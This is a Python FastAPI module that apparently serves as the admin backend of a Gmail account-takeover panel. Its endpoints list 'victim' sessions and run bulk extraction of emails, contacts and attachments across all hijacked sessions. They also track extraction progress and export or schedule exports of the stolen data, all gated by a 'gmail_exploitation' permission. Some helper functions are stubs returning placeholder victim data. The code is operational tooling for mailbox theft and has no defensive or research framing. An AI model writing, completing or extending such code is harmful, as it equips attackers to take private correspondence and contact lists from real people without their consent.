"""
Gmail Interface API Extensions
Additional API endpoints for comprehensive Gmail interface support
"""

import logging
import secrets
import json
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, Optional, List
from bson import ObjectId

from fastapi import APIRouter, HTTPException, status, Query, Depends
from pydantic import BaseModel, Field

from .gmail_access import GmailAccessManager, get_gmail_access_manager
from ..auth.jwt_handler import JWTHandler
from ..auth.permissions import PermissionManager

logger = logging.getLogger(__name__)

router = APIRouter()
jwt_handler = JWTHandler()
permission_manager = PermissionManager()

# Pydantic models for Gmail Interface
class GmailAccessListRequest(BaseModel):
    page: int = Field(1, ge=1)
    page_size: int = Field(25, ge=1, le=100)
    search: Optional[str] = None
    status_filter: Optional[str] = None
    extraction_filter: Optional[str] = None
    date_from: Optional[str] = None
    date_to: Optional[str] = None

class GmailAccessListResponse(BaseModel):
    accesses: List[Dict[str, Any]]
    total_count: int
    page: int
    page_size: int
    total_pages: int
    filters: Dict[str, Any]

class BulkExtractionRequest(BaseModel):
    access_ids: List[str]
    extraction_config: Dict[str, Any] = {}

class ExportRequest(BaseModel):
    access_ids: List[str]
    format: str = Field(..., regex="^(json|csv|pdf|xml)$")
    data_types: List[str] = Field(default_factory=lambda: ["emails", "contacts"])
    filters: Dict[str, Any] = {}
    options: Dict[str, Any] = {}

class ExportTemplateRequest(BaseModel):
    name: str
    description: str
    format: str
    data_types: List[str]
    filters: Dict[str, Any] = {}
    options: Dict[str, Any] = {}

class ScheduleExportRequest(BaseModel):
    name: str
    frequency: str = Field(..., regex="^(daily|weekly|monthly)$")
    time: str = Field(..., regex="^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$")
    export_config: ExportRequest
    enabled: bool = True

# Dependency to get current admin user
async def get_current_admin(credentials: str = Depends(lambda x: x)):
    """Get current admin user from JWT token"""
    try:
        token_data = jwt_handler.decode_token(credentials)
        return {
            "id": token_data["sub"],
            "username": token_data["username"],
            "role": token_data["role"],
            "permissions": token_data["permissions"]
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials"
        )

# Gmail Access List API
@router.get("/gmail/access", response_model=GmailAccessListResponse)
async def get_gmail_access_list(
    request: GmailAccessListRequest = Depends(),
    admin_user: dict = Depends(get_current_admin)
):
    """Get Gmail access list with filtering and pagination"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        gmail_manager = get_gmail_access_manager()

        # Get all active sessions
        sessions = gmail_manager.get_active_sessions()

        # Apply filters
        filtered_sessions = sessions

        if request.search:
            search_term = request.search.lower()
            filtered_sessions = [
                s for s in filtered_sessions
                if search_term in s.victim_id.lower() or
                   (hasattr(s, 'victim_email') and search_term in s.victim_email.lower())
            ]

        if request.status_filter:
            filtered_sessions = [
                s for s in filtered_sessions
                if s.is_active == (request.status_filter == "active")
            ]

        # Sort by creation date (newest first)
        filtered_sessions.sort(key=lambda x: x.created_at, reverse=True)

        # Apply pagination
        total_count = len(filtered_sessions)
        start_index = (request.page - 1) * request.page_size
        end_index = start_index + request.page_size
        paginated_sessions = filtered_sessions[start_index:end_index]

        # Convert to response format
        accesses = []
        for session in paginated_sessions:
            # Get victim information if available
            victim_info = await get_victim_info(session.victim_id) if hasattr(session, 'victim_id') else {}

            access_data = {
                "id": session.session_id,
                "victim_id": session.victim_id,
                "victim_name": victim_info.get("name", "Unknown"),
                "victim_email": victim_info.get("email", "Unknown"),
                "access_status": "active" if session.is_active else "expired",
                "extraction_status": get_extraction_status(session),
                "access_date": session.created_at.isoformat(),
                "last_updated": session.last_access.isoformat(),
                "progress": calculate_extraction_progress(session),
                "extracted_data": {
                    "emails": session.exploitation_results.get("emails_extracted", 0),
                    "contacts": session.exploitation_results.get("contacts_mapped", 0),
                    "attachments": session.exploitation_results.get("attachments_downloaded", 0)
                },
                "token_valid": session.token_valid,
                "emails_accessed": session.emails_accessed
            }
            accesses.append(access_data)

        return GmailAccessListResponse(
            accesses=accesses,
            total_count=total_count,
            page=request.page,
            page_size=request.page_size,
            total_pages=(total_count + request.page_size - 1) // request.page_size,
            filters={
                "search": request.search,
                "status_filter": request.status_filter,
                "extraction_filter": request.extraction_filter
            }
        )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting Gmail access list: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Bulk Extraction API
@router.post("/gmail/extract-all")
async def extract_all_gmail(
    admin_user: dict = Depends(get_current_admin)
):
    """Start bulk extraction for all Gmail accounts"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        gmail_manager = get_gmail_access_manager()

        # Get all active sessions
        sessions = gmail_manager.get_active_sessions()

        if not sessions:
            return {
                "success": False,
                "message": "No active Gmail sessions found"
            }

        extraction_results = []
        for session in sessions:
            try:
                # Start extraction for each session
                result = gmail_manager.execute_gmail_operation(
                    session.session_id,
                    "list_messages",
                    {"max_results": 100}
                )
                extraction_results.append({
                    "session_id": session.session_id,
                    "success": result.get("success", False),
                    "message": result.get("message", "Unknown error")
                })
            except Exception as e:
                logger.error(f"Error starting extraction for session {session.session_id}: {e}")
                extraction_results.append({
                    "session_id": session.session_id,
                    "success": False,
                    "message": str(e)
                })

        successful_extractions = sum(1 for r in extraction_results if r["success"])

        return {
            "success": True,
            "message": f"Started bulk extraction for {successful_extractions}/{len(sessions)} sessions",
            "results": extraction_results
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in bulk Gmail extraction: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Active Extractions API
@router.get("/gmail/extractions/active")
async def get_active_extractions(
    admin_user: dict = Depends(get_current_admin)
):
    """Get all active Gmail extractions"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        gmail_manager = get_gmail_access_manager()
        sessions = gmail_manager.get_active_sessions()

        extractions = []
        for session in sessions:
            if session.is_active:
                extraction_data = {
                    "id": session.session_id,
                    "email": await get_victim_email(session.victim_id),
                    "status": "in_progress" if session.token_valid else "failed",
                    "progress": calculate_extraction_progress(session),
                    "start_time": session.created_at.isoformat(),
                    "duration": (datetime.now(timezone.utc) - session.created_at).total_seconds(),
                    "current_step": get_current_step(session),
                    "stats": {
                        "emails_processed": session.emails_accessed,
                        "contacts_found": session.exploitation_results.get("contacts_mapped", 0),
                        "attachments_found": session.exploitation_results.get("attachments_downloaded", 0),
                        "emails_per_second": calculate_emails_per_second(session)
                    }
                }
                extractions.append(extraction_data)

        return {
            "success": True,
            "extractions": extractions
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting active extractions: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Gmail Data API
@router.get("/gmail/data/{access_id}")
async def get_gmail_data(
    access_id: str,
    admin_user: dict = Depends(get_current_admin)
):
    """Get extracted Gmail data for specific access"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        gmail_manager = get_gmail_access_manager()
        session = gmail_manager.get_session(access_id)

        if not session:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Gmail access not found"
            )

        # Get extracted data from database
        extracted_data = await get_extracted_gmail_data(access_id)

        return {
            "success": True,
            "data": extracted_data
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting Gmail data: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Export Templates API
@router.get("/export/templates")
async def get_export_templates(
    admin_user: dict = Depends(get_current_admin)
):
    """Get all export templates"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "data_export"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        templates = await get_export_templates_from_db()

        return {
            "success": True,
            "templates": templates
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting export templates: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/export/templates")
async def create_export_template(
    template: ExportTemplateRequest,
    admin_user: dict = Depends(get_current_admin)
):
    """Create new export template"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "data_export"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        template_id = await save_export_template_to_db({
            "name": template.name,
            "description": template.description,
            "format": template.format,
            "data_types": template.data_types,
            "filters": template.filters,
            "options": template.options,
            "created_by": admin_user["id"],
            "created_at": datetime.now(timezone.utc)
        })

        return {
            "success": True,
            "template_id": template_id,
            "message": "Export template created successfully"
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error creating export template: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Export History API
@router.get("/export/history")
async def get_export_history(
    page: int = Query(1, ge=1),
    page_size: int = Query(20, ge=1, le=100),
    admin_user: dict = Depends(get_current_admin)
):
    """Get export history"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "data_export"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        history = await get_export_history_from_db(page, page_size)

        return {
            "success": True,
            "history": history
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting export history: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Scheduled Exports API
@router.get("/export/schedules")
async def get_scheduled_exports(
    admin_user: dict = Depends(get_current_admin)
):
    """Get scheduled exports"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "data_export"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        schedules = await get_scheduled_exports_from_db()

        return {
            "success": True,
            "schedules": schedules
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting scheduled exports: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Gmail Accounts API
@router.get("/gmail/accounts")
async def get_gmail_accounts(
    admin_user: dict = Depends(get_current_admin)
):
    """Get all Gmail accounts with access"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        gmail_manager = get_gmail_access_manager()
        sessions = gmail_manager.get_active_sessions()

        accounts = []
        for session in sessions:
            victim_info = await get_victim_info(session.victim_id)
            account_data = {
                "id": session.session_id,
                "email": victim_info.get("email", "Unknown"),
                "name": victim_info.get("name", "Unknown"),
                "status": "active" if session.token_valid else "expired",
                "access_date": session.created_at.isoformat(),
                "last_activity": session.last_access.isoformat()
            }
            accounts.append(account_data)

        return {
            "success": True,
            "accounts": accounts
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting Gmail accounts: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

# Helper functions
async def get_victim_info(victim_id: str) -> Dict[str, Any]:
    """Get victim information from database"""
    try:
        # This would integrate with the victims collection
        # For now, return basic info
        return {
            "name": f"Victim_{victim_id[:8]}",
            "email": f"victim_{victim_id[:8]}@example.com"
        }
    except Exception as e:
        logger.error(f"Error getting victim info: {e}")
        return {}

async def get_victim_email(victim_id: str) -> str:
    """Get victim email"""
    victim_info = await get_victim_info(victim_id)
    return victim_info.get("email", "Unknown")

def get_extraction_status(session) -> str:
    """Get extraction status for session"""
    if not session.is_active:
        return "completed"
    if session.token_valid:
        return "in_progress"
    return "failed"

def calculate_extraction_progress(session) -> int:
    """Calculate extraction progress percentage"""
    if session.exploitation_results.get("emails_extracted", 0) > 0:
        # Simple progress calculation based on emails extracted
        return min(100, session.exploitation_results.get("emails_extracted", 0))
    return 0

def calculate_emails_per_second(session) -> float:
    """Calculate emails per second"""
    duration = (datetime.now(timezone.utc) - session.created_at).total_seconds()
    if duration > 0:
        return session.emails_accessed / duration
    return 0.0

def get_current_step(session) -> str:
    """Get current extraction step"""
    if session.exploitation_results.get("emails_extracted", 0) > 0:
        return "Extracting emails"
    return "Initializing"

async def get_extracted_gmail_data(access_id: str) -> Dict[str, Any]:
    """Get extracted Gmail data from database"""
    try:
        # This would integrate with the actual data storage
        # For now, return mock data structure
        return {
            "emails": [],
            "contacts": [],
            "attachments": []
        }
    except Exception as e:
        logger.error(f"Error getting extracted Gmail data: {e}")
        return {"emails": [], "contacts": [], "attachments": []}

async def get_export_templates_from_db() -> List[Dict[str, Any]]:
    """Get export templates from database"""
    try:
        # This would integrate with the actual templates storage
        return []
    except Exception as e:
        logger.error(f"Error getting export templates: {e}")
        return []

async def save_export_template_to_db(template_data: Dict[str, Any]) -> str:
    """Save export template to database"""
    try:
        # This would integrate with the actual templates storage
        return f"template_{secrets.token_hex(8)}"
    except Exception as e:
        logger.error(f"Error saving export template: {e}")
        raise

async def get_export_history_from_db(page: int, page_size: int) -> List[Dict[str, Any]]:
    """Get export history from database"""
    try:
        # This would integrate with the actual export history storage
        return []
    except Exception as e:
        logger.error(f"Error getting export history: {e}")
        return []

async def get_scheduled_exports_from_db() -> List[Dict[str, Any]]:
    """Get scheduled exports from database"""
    try:
        # This would integrate with the actual scheduled exports storage
        return []
    except Exception as e:
        logger.error(f"Error getting scheduled exports: {e}")
        return []